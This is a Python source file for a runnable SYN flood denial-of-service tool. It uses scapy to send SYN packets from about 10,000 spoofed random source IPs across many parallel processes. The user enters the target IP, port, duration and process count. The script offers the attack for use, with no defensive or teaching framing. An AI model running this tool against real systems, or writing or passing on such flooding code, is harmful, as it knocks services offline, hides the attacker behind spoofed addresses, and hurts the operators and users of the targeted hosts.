#!/usr/bin/env python3
# Fast SYN Flood Attack (Denial of Service - DoS)

import random
import time
import os
import signal
import sys
import multiprocessing
from scapy.all import IP, TCP, send, conf

def generate_spoofed_ips(num_ips=10000):
    """Generates a list of random spoofed IPv4 addresses."""
    return [".".join(str(random.randint(1, 254)) for _ in range(4)) for _ in range(num_ips)]

def syn_flood_worker(target_ip, target_port, running_flag, packet_counter, iface, spoofed_ips):
    """
    Worker function that continuously sends SYN packets directly to the target IP address.
    No MAC resolution required.
    """
    current_ip_index = 0
    while running_flag.value:
        try:
            # Cycle through the list of spoofed IPs for faster packet generation
            src_ip = spoofed_ips[current_ip_index]
            current_ip_index = (current_ip_index + 1) % len(spoofed_ips)
            src_port = random.randint(1024, 65535)
            packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
            
            # Send the SYN packet over the specified interface
            send(packet, verbose=0, iface=iface)

            # Track the number of packets sent
            packet_counter.value += 1
        except Exception as e:
            continue

def main():
    if os.getuid() != 0:
        print("❌ This script requires root privileges (sudo).")
        sys.exit(1)

    # Get user input for the attack configuration.
    target_ip = input("Enter target IP address: ").strip()
    target_port = int(input("Enter target port (e.g., 80): ").strip())
    duration = int(input("Enter attack duration in seconds: ").strip())
    num_processes = int(input("Enter number of processes to spawn (e.g., 100): ").strip())
    iface = input("Enter network interface (e.g., eth0) [optional]: ").strip() or None

    if not iface:
        iface = conf.iface  # Default to the active interface if none is specified
        print(f"Using default interface: {iface}")

    # Pre-generate a large number of spoofed IPs (increase this number if needed)
    spoofed_ips = generate_spoofed_ips(10000)

    # Create a shared flag to signal processes to stop.
    manager = multiprocessing.Manager()
    running_flag = manager.Value('i', 1)

    # Create a shared counter to track the number of packets sent
    packet_counter = manager.Value('i', 0)

    processes = []
    print("\n🚀 Starting SYN Flood Attack...")

    # Spawn processes
    for _ in range(num_processes):
        p = multiprocessing.Process(target=syn_flood_worker,
                                    args=(target_ip, target_port, running_flag, packet_counter, iface, spoofed_ips))
        p.start()
        processes.append(p)

    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            print(f"\rElapsed time: {elapsed:.1f}s | Packets sent: {packet_counter.value}", end='', flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 Attack interrupted by user!")
    finally:
        running_flag.value = 0
        for p in processes:
            p.terminate()
            p.join()

    print(f"\n\n📊 Attack finished. Total packets sent: {packet_counter.value}")

if __name__ == "__main__":
    # Set up signal handler for graceful termination.
    signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
    main()
